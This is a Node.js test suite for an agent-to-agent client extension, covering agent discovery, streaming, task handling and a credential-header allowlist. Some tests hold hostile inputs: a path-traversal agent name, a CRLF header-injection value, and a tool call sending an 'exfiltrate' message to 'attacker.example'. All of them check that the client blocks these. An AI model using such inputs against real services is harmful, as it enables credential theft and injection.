import { after, before, describe, it } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  A2AError,
  MAX_AGENT_CARD_BYTES,
  assertAllowedBaseUrl,
  buildAgentUrl,
  cancelTask,
  discoverAgents,
  getTask,
  isReplyWithheld,
  normalizeResult,
  parseSseStream,
  sendMessage,
} from "../src/client.mjs";
import {
  ALLOWED_HEADER_NAMES,
  parseHeadersHelperOutput,
  resolveHeaders,
  runHeadersHelper,
  splitCommandTokens,
  validateAndNormalizeHeaders,
} from "../src/headers-helper.mjs";
import registerPiA2aExtension, { readConfig } from "../src/extension.mjs";

// ---------------------------------------------------------------------------
// Mock A2A gateway
// ---------------------------------------------------------------------------

const cards = {
  root: { name: "Gateway", description: "Root agent", url: "/", version: "1.0.0", capabilities: { streaming: true }, skills: [] },
  echo: {
    name: "Echo",
    description: "Echoes text back",
    version: "2.1.0",
    capabilities: { streaming: true },
    skills: [{ id: "echo", name: "Echo", description: "Repeat input" }],
  },
  clerk: {
    name: "Clerk",
    description: "Asks clarifying questions",
    version: "0.9.0",
    capabilities: { streaming: false },
    skills: [{ id: "intake", name: "Intake" }],
  },
};

/** @type {Map<string, any>} */
const tasks = new Map();
/** @type {Array<{ path: string; headers: http.IncomingHttpHeaders; body: any }>} */
const requests = [];

let counter = 0;
const nextId = (prefix) => `${prefix}-${++counter}`;

function text(t) {
  return [{ kind: "text", text: t }];
}

function json(res, status, payload) {
  const body = JSON.stringify(payload);
  res.writeHead(status, { "content-type": "application/json", "content-length": Buffer.byteLength(body) });
  res.end(body);
}

function rpcResult(res, id, result, status = 200) {
  json(res, status, { jsonrpc: "2.0", id, result });
}

function rpcError(res, id, code, message, data, status = 200) {
  json(res, status, { jsonrpc: "2.0", id, error: { code, message, data } });
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

function sseWrite(res, payload, { event } = {}) {
  if (event) res.write(`event: ${event}\n`);
  res.write(`data: ${JSON.stringify(payload)}\n\n`);
}

/**
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 */
async function handle(req, res) {
  const url = new URL(req.url ?? "/", "http://127.0.0.1");
  const path = url.pathname;

  if (req.method === "GET") {
    if (path === "/.well-known/agent.json") return json(res, 200, cards.root);
    if (path === "/a2a") return json(res, 200, { agents: ["echo", { name: "clerk", description: "dir entry" }] });
    if (path === "/a2a/echo/.well-known/agent.json") return json(res, 200, cards.echo);
    if (path === "/a2a/clerk/.well-known/agent.json") return json(res, 200, cards.clerk);
    if (path === "/a2a/big/.well-known/agent.json") {
      return json(res, 200, { name: "Big", padding: "x".repeat(MAX_AGENT_CARD_BYTES + 1024) });
    }
    if (path === "/a2a/redirect/.well-known/agent.json") {
      res.writeHead(302, { location: "/a2a/echo/.well-known/agent.json" });
      return res.end();
    }
    res.writeHead(404);
    return res.end("not found");
  }

  if (req.method !== "POST") {
    res.writeHead(405);
    return res.end();
  }

  const raw = await readBody(req);
  const rpc = JSON.parse(raw);
  requests.push({ path, headers: req.headers, body: rpc });
  const { id, method, params } = rpc;
  const agent = path.replace(/^\/a2a\//, "");

  if (agent === "withheld") {
    const msg = params?.message?.parts?.[0]?.text ?? "";
    if (msg.includes("rpc-error")) {
      return rpcError(res, id, -32000, "Reply withheld by policy", { reason: "reply_withheld", category: "policy" });
    }
    res.writeHead(502, { "content-type": "text/plain" });
    return res.end("Bad Gateway");
  }

  if (method === "message/send") {
    const incoming = params.message;
    const userText = incoming.parts.map((p) => p.text ?? "").join("");
    if (agent === "echo") {
      const taskId = incoming.taskId ?? nextId("task");
      const task = {
        kind: "task",
        id: taskId,
        contextId: incoming.contextId ?? nextId("ctx"),
        status: { state: "completed" },
        artifacts: [{ artifactId: "a1", parts: text(`echo: ${userText}`) }],
      };
      tasks.set(taskId, task);
      return rpcResult(res, id, task);
    }
    if (agent === "clerk") {
      if (incoming.taskId) {
        const existing = tasks.get(incoming.taskId);
        if (!existing) return rpcError(res, id, -32001, "Task not found");
        if (existing.status.state !== "input-required") return rpcError(res, id, -32002, "Task not continuable");
        existing.status = { state: "completed", message: { role: "agent", parts: text(`Filed under ${userText}.`) } };
        existing.history.push(incoming);
        return rpcResult(res, id, existing);
      }
      const task = {
        kind: "task",
        id: nextId("task"),
        contextId: incoming.contextId ?? nextId("ctx"),
        status: { state: "input-required", message: { role: "agent", parts: text("Which category should I file this under?") } },
        history: [incoming],
      };
      tasks.set(task.id, task);
      return rpcResult(res, id, task);
    }
    if (agent === "slow") {
      const task = { kind: "task", id: nextId("task"), contextId: nextId("ctx"), status: { state: "working" } };
      tasks.set(task.id, task);
      return rpcResult(res, id, task);
    }
    return rpcError(res, id, -32601, "Unknown agent");
  }

  if (method === "message/stream") {
    const incoming = params.message;
    const userText = incoming.parts.map((p) => p.text ?? "").join("");
    const taskId = nextId("task");
    const contextId = nextId("ctx");
    res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
    res.write(": keep-alive\n\n");
    sseWrite(res, { jsonrpc: "2.0", id, result: { kind: "status-update", taskId, contextId, status: { state: "working" }, final: false } });
    sseWrite(res, {
      jsonrpc: "2.0",
      id,
      result: { kind: "artifact-update", taskId, contextId, artifact: { artifactId: "a1", parts: text("stream: ") }, append: false },
    });
    sseWrite(res, {
      jsonrpc: "2.0",
      id,
      result: { kind: "artifact-update", taskId, contextId, artifact: { artifactId: "a1", parts: text(userText) }, append: true, lastChunk: true },
    });
    if (agent === "stream-withheld") {
      sseWrite(res, { jsonrpc: "2.0", id, error: { code: -32000, message: "Withheld mid-stream", data: { reason: "reply_withheld" } } });
      return res.end();
    }
    sseWrite(res, { jsonrpc: "2.0", id, result: { kind: "status-update", taskId, contextId, status: { state: "completed" }, final: true } });
    tasks.set(taskId, { kind: "task", id: taskId, contextId, status: { state: "completed" }, artifacts: [{ artifactId: "a1", parts: text(`stream: ${userText}`) }] });
    return res.end();
  }

  if (method === "tasks/get") {
    const task = tasks.get(params.id);
    if (!task) return rpcError(res, id, -32001, "Task not found");
    return rpcResult(res, id, task);
  }

  if (method === "tasks/cancel") {
    const task = tasks.get(params.id);
    if (!task) return rpcError(res, id, -32001, "Task not found");
    task.status = { state: "canceled" };
    return rpcResult(res, id, task);
  }

  return rpcError(res, id, -32601, "Method not found");
}

/** @type {http.Server} */
let server;
/** @type {string} */
let baseUrl;
/** @type {string} */
let tmpDir;
/** @type {string} */
let goodHelper;
/** @type {string} */
let badHelper;

before(async () => {
  server = http.createServer((req, res) => {
    handle(req, res).catch((err) => {
      res.writeHead(500);
      res.end(String(err));
    });
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = /** @type {import("node:net").AddressInfo} */ (server.address());
  baseUrl = `http://127.0.0.1:${address.port}`;

  tmpDir = mkdtempSync(join(tmpdir(), "pi-a2a-test-"));
  goodHelper = join(tmpDir, "good-helper.mjs");
  writeFileSync(
    goodHelper,
    `process.stdout.write(JSON.stringify({ Authorization: "Bearer test-token-abc", "X-Goog-IAP-JWT-Assertion": "jwt-xyz" }));\n`,
  );
  badHelper = join(tmpDir, "bad-helper.mjs");
  writeFileSync(badHelper, `process.stdout.write(JSON.stringify({ authorization: "Bearer ok", cookie: "session=SECRETVALUE" }));\n`);
});

after(async () => {
  await new Promise((resolve) => server.close(resolve));
  rmSync(tmpDir, { recursive: true, force: true });
});

/** Minimal fake Pi ExtensionAPI capturing registered tools. */
function fakePi() {
  /** @type {Map<string, any>} */
  const tools = new Map();
  return {
    tools,
    registerTool(tool) {
      tools.set(tool.name, tool);
    },
  };
}

// ---------------------------------------------------------------------------
// 1. Agent Card discovery
// ---------------------------------------------------------------------------

describe("Agent Card discovery", () => {
  it("fetches a single agent card via /a2a/{agent}/.well-known/agent.json", async () => {
    const result = await discoverAgents({ baseUrl, agent: "echo" });
    assert.equal(result.agents.length, 1);
    assert.equal(result.agents[0].agent, "echo");
    assert.equal(result.agents[0].name, "Echo");
    assert.equal(result.agents[0].streaming, true);
    assert.deepEqual(result.agents[0].skills, [{ id: "echo", name: "Echo", description: "Repeat input" }]);
    assert.equal(result.agents[0].cardUrl, `${baseUrl}/a2a/echo/.well-known/agent.json`);
  });

  it("fetches the root card and /a2a directory when agent is omitted", async () => {
    const result = await discoverAgents({ baseUrl });
    const names = result.agents.map((a) => a.agent ?? "(root)").sort();
    assert.deepEqual(names, ["(root)", "clerk", "echo"]);
    assert.deepEqual(result.directory.map((d) => d.name), ["echo", "clerk"]);
    assert.deepEqual(result.errors, []);
  });

  it("enforces HTTPS except for loopback hosts", () => {
    assert.doesNotThrow(() => assertAllowedBaseUrl("https://agents.example.com"));
    assert.doesNotThrow(() => assertAllowedBaseUrl("http://127.0.0.1:8080"));
    assert.doesNotThrow(() => assertAllowedBaseUrl("http://localhost:8080/base"));
    assert.throws(() => assertAllowedBaseUrl("http://agents.example.com"), A2AError);
    assert.throws(() => assertAllowedBaseUrl("ftp://agents.example.com"), A2AError);
    assert.throws(() => assertAllowedBaseUrl("https://user:pw@agents.example.com"), /credentials/);
    assert.throws(() => assertAllowedBaseUrl(""), /required/);
  });

  it("builds agent URLs under a base path and rejects unsafe agent names", () => {
    assert.equal(buildAgentUrl("https://h.example/api/", "echo", "/.well-known/agent.json"), "https://h.example/api/a2a/echo/.well-known/agent.json");
    assert.equal(buildAgentUrl("https://h.example", undefined, "/a2a"), "https://h.example/a2a");
    assert.throws(() => buildAgentUrl(baseUrl, "../etc", "/x"), A2AError);
    assert.throws(() => buildAgentUrl(baseUrl, "a/b", "/x"), A2AError);
  });

  it("refuses redirects", async () => {
    await assert.rejects(discoverAgents({ baseUrl, agent: "redirect" }), A2AError);
  });

  it("caps Agent Card bodies at 64 KiB", async () => {
    await assert.rejects(discoverAgents({ baseUrl, agent: "big" }), /exceeds limit of 65536 bytes/);
  });

  it("reports a missing card as 404", async () => {
    await assert.rejects(discoverAgents({ baseUrl, agent: "nope" }), /HTTP 404/);
  });
});

// ---------------------------------------------------------------------------
// 2. message/send
// ---------------------------------------------------------------------------

describe("message/send", () => {
  it("sends a JSON-RPC 2.0 request and normalizes the completed task", async () => {
    requests.length = 0;
    const result = await sendMessage({ baseUrl, agent: "echo", message: "hello", messageId: "m-1", contextId: "ctx-fixed" });
    assert.equal(result.state, "completed");
    assert.equal(result.text, "echo: hello");
    assert.match(result.taskId, /^task-/);
    assert.equal(result.contextId, "ctx-fixed");
    assert.equal(result.raw.kind, "task");

    const sent = requests.at(-1);
    assert.equal(sent.path, "/a2a/echo");
    assert.equal(sent.body.jsonrpc, "2.0");
    assert.equal(sent.body.method, "message/send");
    assert.equal(sent.body.params.message.messageId, "m-1");
    assert.equal(sent.body.params.message.role, "user");
    assert.deepEqual(sent.body.params.message.parts, [{ kind: "text", text: "hello" }]);
    assert.equal(sent.headers["content-type"], "application/json");
    assert.equal(sent.headers.accept, "application/json");
  });

  it("rejects an empty message and surfaces JSON-RPC errors", async () => {
    await assert.rejects(sendMessage({ baseUrl, agent: "echo", message: "   " }), /non-empty/);
    await assert.rejects(sendMessage({ baseUrl, agent: "unknown-agent", message: "x" }), (err) => {
      assert.ok(err instanceof A2AError);
      assert.equal(err.code, -32601);
      return true;
    });
  });

  it("normalizes direct Message results", () => {
    const normalized = normalizeResult({ kind: "message", role: "agent", parts: text("hi"), taskId: "t", contextId: "c" });
    assert.deepEqual({ ...normalized, raw: undefined }, { taskId: "t", contextId: "c", state: "completed", text: "hi", raw: undefined });
  });
});

// ---------------------------------------------------------------------------
// 3. message/stream (SSE)
// ---------------------------------------------------------------------------

describe("message/stream SSE", () => {
  it("parses SSE frames including CRLF, comments, and multi-line data", async () => {
    const encoder = new TextEncoder();
    const chunks = [
      ": comment\r\n",
      "event: status\r\ndata: {\"a\":\r\n",
      "data: 1}\r\n\r\n",
      "id: 7\ndata: second\n\n",
      "data: tail-no-newline",
    ];
    const stream = new ReadableStream({
      start(controller) {
        for (const c of chunks) controller.enqueue(encoder.encode(c));
        controller.close();
      },
    });
    const frames = [];
    for await (const frame of parseSseStream(stream)) frames.push(frame);
    assert.deepEqual(frames, [
      { event: "status", data: '{"a":\n1}', id: undefined },
      { event: "message", data: "second", id: "7" },
      { event: "message", data: "tail-no-newline", id: "7" },
    ]);
  });

  it("enforces the SSE byte cap", async () => {
    const stream = new ReadableStream({
      start(controller) {
        controller.enqueue(new Uint8Array(2048));
        controller.close();
      },
    });
    await assert.rejects(
      (async () => {
        for await (const _ of parseSseStream(stream, { maxBytes: 1024 })) {
          // drain
        }
      })(),
      /SSE stream exceeds limit/,
    );
  });

  it("streams status-update and artifact-update events to completion", async () => {
    requests.length = 0;
    const events = [];
    const result = await sendMessage({ baseUrl, agent: "echo", message: "world", stream: true, onEvent: (e) => events.push(e) });
    assert.equal(requests.at(-1).body.method, "message/stream");
    assert.equal(requests.at(-1).headers.accept, "text/event-stream");
    assert.equal(result.state, "completed");
    assert.equal(result.text, "stream: world");
    assert.match(result.taskId, /^task-/);
    assert.match(result.contextId, /^ctx-/);
    assert.deepEqual(
      events.map((e) => e.kind),
      ["status-update", "artifact-update", "artifact-update", "status-update"],
    );
    assert.equal(events.at(-1).final, true);
    assert.equal(result.events.length, 4);
  });
});

// ---------------------------------------------------------------------------
// 4. input-required + a2a_reply continuation (via extension tools)
// ---------------------------------------------------------------------------

describe("input-required + a2a_reply continuation", () => {
  it("registers exactly five tools reading defaults from process.env", () => {
    const saved = { url: process.env.PI_A2A_URL, helper: process.env.PI_A2A_HEADERS_HELPER };
    process.env.PI_A2A_URL = baseUrl;
    delete process.env.PI_A2A_HEADERS_HELPER;
    try {
      const pi = fakePi();
      registerPiA2aExtension(pi);
      assert.deepEqual([...pi.tools.keys()].sort(), ["a2a_agents", "a2a_cancel", "a2a_reply", "a2a_send", "a2a_status"]);
      for (const tool of pi.tools.values()) {
        assert.equal(typeof tool.execute, "function");
        assert.equal(tool.parameters.type, "object");
        assert.ok(tool.description.length > 10);
        // Header values must never be accepted from the model.
        assert.equal(tool.parameters.properties.headers, undefined);
        assert.equal(tool.parameters.properties.headers_helper, undefined);
      }
      assert.equal(readConfig().baseUrl, baseUrl);
      assert.equal(readConfig().headersHelper, undefined);
    } finally {
      if (saved.url === undefined) delete process.env.PI_A2A_URL;
      else process.env.PI_A2A_URL = saved.url;
      if (saved.helper !== undefined) process.env.PI_A2A_HEADERS_HELPER = saved.helper;
    }
  });

  it("a2a_send returns input-required, a2a_reply continues the task to completion", async () => {
    const pi = fakePi();
    registerPiA2aExtension(pi, { env: { PI_A2A_URL: baseUrl, PI_A2A_AGENT: "clerk" } });

    const first = await pi.tools.get("a2a_send").execute("call-1", { message: "Please file this receipt" }, undefined, undefined, {});
    assert.notEqual(first.isError, true);
    assert.equal(first.details.state, "input-required");
    assert.match(first.content[0].text, /input-required/);
    assert.match(first.content[0].text, /Which category/);
    assert.match(first.content[0].text, /a2a_reply/);
    const taskId = first.details.taskId;
    assert.ok(taskId);

    const status = await pi.tools.get("a2a_status").execute("call-2", { task_id: taskId }, undefined, undefined, {});
    assert.equal(status.details.state, "input-required");

    const reply = await pi.tools.get("a2a_reply").execute("call-3", { task_id: taskId, message: "Travel" }, undefined, undefined, {});
    assert.notEqual(reply.isError, true);
    assert.equal(reply.details.state, "completed");
    assert.equal(reply.details.taskId, taskId);
    assert.match(reply.content[0].text, /Filed under Travel\./);

    const sent = requests.at(-1);
    assert.equal(sent.body.method, "message/send");
    assert.equal(sent.body.params.message.taskId, taskId);
  });

  it("returns isError results without throwing when configuration is missing", async () => {
    const pi = fakePi();
    registerPiA2aExtension(pi, { env: {} });
    const result = await pi.tools.get("a2a_send").execute("call-x", { message: "hi" }, undefined, undefined, {});
    assert.equal(result.isError, true);
    assert.match(result.content[0].text, /PI_A2A_URL/);

    const insecure = await pi.tools.get("a2a_agents").execute("call-y", { url: "http://agents.example.com" }, undefined, undefined, {});
    assert.equal(insecure.isError, true);
    assert.match(insecure.content[0].text, /https/);
  });
});

// ---------------------------------------------------------------------------
// 5. tasks/get + tasks/cancel
// ---------------------------------------------------------------------------

describe("tasks/get + tasks/cancel", () => {
  it("fetches a working task then cancels it", async () => {
    const started = await sendMessage({ baseUrl, agent: "slow", message: "long job" });
    assert.equal(started.state, "working");

    const fetched = await getTask({ baseUrl, agent: "slow", taskId: started.taskId });
    assert.equal(fetched.state, "working");
    assert.equal(fetched.taskId, started.taskId);
    assert.equal(requests.at(-1).body.method, "tasks/get");
    assert.deepEqual(requests.at(-1).body.params, { id: started.taskId });

    const canceled = await cancelTask({ baseUrl, agent: "slow", taskId: started.taskId });
    assert.equal(canceled.state, "canceled");
    assert.equal(requests.at(-1).body.method, "tasks/cancel");

    const again = await getTask({ baseUrl, agent: "slow", taskId: started.taskId });
    assert.equal(again.state, "canceled");
  });

  it("surfaces unknown task ids as A2AError and validates input", async () => {
    await assert.rejects(getTask({ baseUrl, agent: "slow", taskId: "missing" }), /Task not found/);
    await assert.rejects(cancelTask({ baseUrl, agent: "slow", taskId: "" }), /taskId is required/);
  });

  it("a2a_cancel tool reports the canceled state", async () => {
    const pi = fakePi();
    registerPiA2aExtension(pi, { env: { PI_A2A_URL: baseUrl } });
    const started = await sendMessage({ baseUrl, agent: "slow", message: "job" });
    const result = await pi.tools.get("a2a_cancel").execute("c", { task_id: started.taskId, agent: "slow" }, undefined, undefined, {});
    assert.notEqual(result.isError, true);
    assert.equal(result.details.state, "canceled");
  });
});

// ---------------------------------------------------------------------------
// 6. reply_withheld handling
// ---------------------------------------------------------------------------

describe("reply_withheld error handling", () => {
  it("treats HTTP 502 as reply_withheld for message/send", async () => {
    const result = await sendMessage({ baseUrl, agent: "withheld", message: "anything" });
    assert.equal(result.state, "reply_withheld");
    assert.equal(result.text, "");
    assert.match(result.error, /502/);
  });

  it("treats a JSON-RPC error with data.reason === reply_withheld as reply_withheld", async () => {
    const result = await sendMessage({ baseUrl, agent: "withheld", message: "trigger rpc-error" });
    assert.equal(result.state, "reply_withheld");
    assert.match(result.error, /Reply withheld by policy/);
    assert.deepEqual(result.raw, { reason: "reply_withheld", category: "policy" });
  });

  it("handles reply_withheld mid-stream and keeps partial text", async () => {
    const result = await sendMessage({ baseUrl, agent: "stream-withheld", message: "partial", stream: true });
    assert.equal(result.state, "reply_withheld");
    assert.equal(result.text, "stream: partial");
    assert.match(result.error, /Withheld mid-stream/);
  });

  it("handles HTTP 502 on message/stream", async () => {
    const result = await sendMessage({ baseUrl, agent: "withheld", message: "x", stream: true });
    assert.equal(result.state, "reply_withheld");
  });

  it("isReplyWithheld helper covers both signals", () => {
    assert.equal(isReplyWithheld({ status: 502 }), true);
    assert.equal(isReplyWithheld({ status: 200, error: { data: { reason: "reply_withheld" } } }), true);
    assert.equal(isReplyWithheld({ status: 200, error: { data: { reason: "other" } } }), false);
    assert.equal(isReplyWithheld({ status: 500 }), false);
  });

  it("a2a_send tool explains the withheld state to the model", async () => {
    const pi = fakePi();
    registerPiA2aExtension(pi, { env: { PI_A2A_URL: baseUrl } });
    const result = await pi.tools.get("a2a_send").execute("w", { message: "x", agent: "withheld" }, undefined, undefined, {});
    assert.notEqual(result.isError, true);
    assert.equal(result.details.state, "reply_withheld");
    assert.match(result.content[0].text, /withheld/);
  });
});

// ---------------------------------------------------------------------------
// 7. headersHelper allowlist / redaction
// ---------------------------------------------------------------------------

describe("headersHelper allowlist and redaction", () => {
  it("only allows authorization and x-goog-iap-jwt-assertion", () => {
    assert.deepEqual([...ALLOWED_HEADER_NAMES].sort(), ["authorization", "x-goog-iap-jwt-assertion"]);
    assert.deepEqual(validateAndNormalizeHeaders({ Authorization: " Bearer abc " }), { authorization: "Bearer abc" });
    assert.throws(() => validateAndNormalizeHeaders({ cookie: "session=TOPSECRET" }), (err) => {
      assert.match(err.message, /Disallowed header name "cookie"/);
      assert.doesNotMatch(err.message, /TOPSECRET/);
      return true;
    });
    assert.throws(() => validateAndNormalizeHeaders({ authorization: "Bearer bad\r\nx: y" }), (err) => {
      assert.match(err.message, /control characters/);
      assert.doesNotMatch(err.message, /Bearer bad/);
      return true;
    });
    assert.throws(() => validateAndNormalizeHeaders({ authorization: 42 }), /non-string/);
    assert.throws(() => validateAndNormalizeHeaders(["authorization"]), /JSON object/);
  });

  it("parses JSON and Header: value output without leaking values", () => {
    assert.deepEqual(parseHeadersHelperOutput('{"Authorization":"Bearer j"}'), { authorization: "Bearer j" });
    assert.deepEqual(parseHeadersHelperOutput("Authorization: Bearer l\nX-Goog-IAP-JWT-Assertion: jwt\n"), {
      authorization: "Bearer l",
      "x-goog-iap-jwt-assertion": "jwt",
    });
    assert.deepEqual(parseHeadersHelperOutput("   "), {});
    assert.throws(() => parseHeadersHelperOutput("{not json SECRET"), (err) => {
      assert.doesNotMatch(err.message, /SECRET/);
      return true;
    });
    assert.throws(() => parseHeadersHelperOutput("no-colon-line SECRET"), (err) => {
      assert.doesNotMatch(err.message, /SECRET/);
      return true;
    });
  });

  it("splits command tokens without a shell", () => {
    assert.deepEqual(splitCommandTokens(`"/path with space/tool" --flag 'single quoted' plain`), [
      "/path with space/tool",
      "--flag",
      "single quoted",
      "plain",
    ]);
    assert.throws(() => splitCommandTokens(`"unclosed`), /unclosed quote/);
    assert.throws(() => splitCommandTokens(""), /must not be empty/);
  });

  it("runs a helper via execFile and applies the allowlist", async () => {
    const headers = await runHeadersHelper([process.execPath, goodHelper]);
    assert.deepEqual(headers, { authorization: "Bearer test-token-abc", "x-goog-iap-jwt-assertion": "jwt-xyz" });

    await assert.rejects(runHeadersHelper(`"${process.execPath}" "${badHelper}"`), (err) => {
      assert.match(err.message, /Disallowed header name "cookie"/);
      assert.doesNotMatch(err.message, /SECRETVALUE/);
      return true;
    });

    await assert.rejects(runHeadersHelper([process.execPath, "-e", "process.exit(3)"]), /execution failed \(code: 3/);
    await assert.rejects(
      runHeadersHelper([process.execPath, "-e", "setTimeout(() => {}, 5000)"], { timeoutMs: 200 }),
      /timed out/,
    );
    await assert.rejects(
      runHeadersHelper([process.execPath, "-e", `process.stdout.write('{"authorization":"' + "x".repeat(2000) + '"}')`], {
        maxBufferBytes: 512,
      }),
      /exceeded maximum size/,
    );
  });

  it("merges static headers with helper output", async () => {
    const merged = await resolveHeaders({ headersHelper: [process.execPath, goodHelper], headers: { Authorization: "Bearer override" } });
    assert.deepEqual(merged, { authorization: "Bearer override", "x-goog-iap-jwt-assertion": "jwt-xyz" });
  });

  it("extension sends helper headers to the gateway via PI_A2A_HEADERS_HELPER", async () => {
    requests.length = 0;
    const pi = fakePi();
    registerPiA2aExtension(pi, {
      env: { PI_A2A_URL: baseUrl, PI_A2A_HEADERS_HELPER: `"${process.execPath}" "${goodHelper}"` },
    });
    const result = await pi.tools.get("a2a_send").execute("h", { message: "auth test", agent: "echo" }, undefined, undefined, {});
    assert.notEqual(result.isError, true);
    const sent = requests.at(-1);
    assert.equal(sent.headers.authorization, "Bearer test-token-abc");
    assert.equal(sent.headers["x-goog-iap-jwt-assertion"], "jwt-xyz");

    const failing = fakePi();
    registerPiA2aExtension(failing, {
      env: { PI_A2A_URL: baseUrl, PI_A2A_HEADERS_HELPER: `"${process.execPath}" "${badHelper}"` },
    });
    const blocked = await failing.tools.get("a2a_send").execute("h2", { message: "x", agent: "echo" }, undefined, undefined, {});
    assert.equal(blocked.isError, true);
    assert.match(blocked.content[0].text, /Disallowed header name "cookie"/);
    assert.doesNotMatch(blocked.content[0].text, /SECRETVALUE/);
  });

  it("refuses to send headersHelper credentials to a model-supplied cross-origin URL", async () => {
    const reqCountBefore = requests.length;
    const pi = fakePi();
    registerPiA2aExtension(pi, {
      env: { PI_A2A_URL: baseUrl, PI_A2A_HEADERS_HELPER: `"${process.execPath}" "${goodHelper}"` },
    });
    const res = await pi.tools.get("a2a_send").execute(
      "tc-origin",
      { url: "https://attacker.example/a2a", message: "exfiltrate", agent: "echo" },
      undefined,
      undefined,
      {},
    );
    assert.equal(res.isError, true);
    assert.match(res.content[0].text, /cross-origin URL/);
    assert.doesNotMatch(res.content[0].text, /test-token-abc/);
    assert.equal(requests.length, reqCountBefore);

    const noBase = fakePi();
    registerPiA2aExtension(noBase, {
      env: { PI_A2A_HEADERS_HELPER: `"${process.execPath}" "${goodHelper}"` },
    });
    const res2 = await noBase.tools.get("a2a_send").execute(
      "tc-no-base",
      { url: "https://attacker.example/a2a", message: "exfiltrate" },
      undefined,
      undefined,
      {},
    );
    assert.equal(res2.isError, true);
    assert.match(res2.content[0].text, /PI_A2A_URL is not configured/);
  });
});
